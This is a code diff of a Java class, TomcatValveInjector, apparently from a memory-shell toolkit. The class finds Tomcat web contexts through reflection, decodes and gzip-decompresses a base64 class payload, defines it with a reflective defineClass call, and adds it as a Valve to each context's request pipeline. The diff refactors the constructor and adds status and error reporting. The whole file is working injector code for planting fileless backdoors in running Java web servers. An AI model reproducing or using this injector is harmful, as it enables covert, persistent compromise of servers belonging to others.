@@ -3,34 +3,18 @@ package com.reajason.javaweb.memshell.injector.tomcat;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
- * Date: 2022/11/01
- * Author: pen4uin
- * Description: Tomcat Valve 注入器
- * Tested version：
- * jdk    v1.8.0_275
- * tomcat v8.5.83, v9.0.67
- *
- * @author ReaJason
+ * @author pen4uin, ReaJason
  */
 public class TomcatValveInjector {
 
-    public TomcatValveInjector() {
-        try {
-            List<Object> contexts = getContext();
-            for (Object context : contexts) {
-                Object valve = getShell(context);
-                inject(context, valve);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+    private String msg = "";
 
     public String getClassName() {
         return "{{className}}";
@@ -38,6 +22,45 @@ public class TomcatValveInjector {
 
     public String getBase64String() {
         return "{{base64Str}}";
+    }
+
+    public TomcatValveInjector() {
+        List<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[/*] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public List<Object> getContext() throws Exception {
@@ -62,41 +85,37 @@ public class TomcatValveInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = context.getClass().getClassLoader();
+        Class<?> clazz = null;
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
     @SuppressWarnings("all")
     public void inject(Object context, Object valve) throws Exception {
         Object pipeline = invokeMethod(context, "getPipeline", null, null);
-        if (isInjected(pipeline)) {
-            System.out.println("valve already injected");
-            return;
+        Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", null, null);
+        List<Object> valvesList = Arrays.asList(valves);
+        for (Object v : valvesList) {
+            if (v.getClass().getName().contains(getClassName())) {
+                return;
+            }
         }
         Class valveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
         invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
-        System.out.println("valve injected successfully");
     }
 
-    @SuppressWarnings("all")
-    public boolean isInjected(Object pipeline) throws Exception {
-        Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", null, null);
-        List<Object> valvesList = Arrays.asList(valves);
-        for (Object valve : valvesList) {
-            if (valve.getClass().getName().contains(getClassName())) {
-                return true;
-            }
-        }
-        return false;
+    @Override
+    public String toString() {
+        return msg;
     }
-
 
     @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
@@ -144,7 +163,7 @@ public class TomcatValveInjector {
 
             }
         }
-        throw new NoSuchFieldException(name);
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
     @SuppressWarnings("all")
@@ -170,6 +189,21 @@ public class TomcatValveInjector {
             return method.invoke(obj instanceof Class ? null : obj, param);
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 }
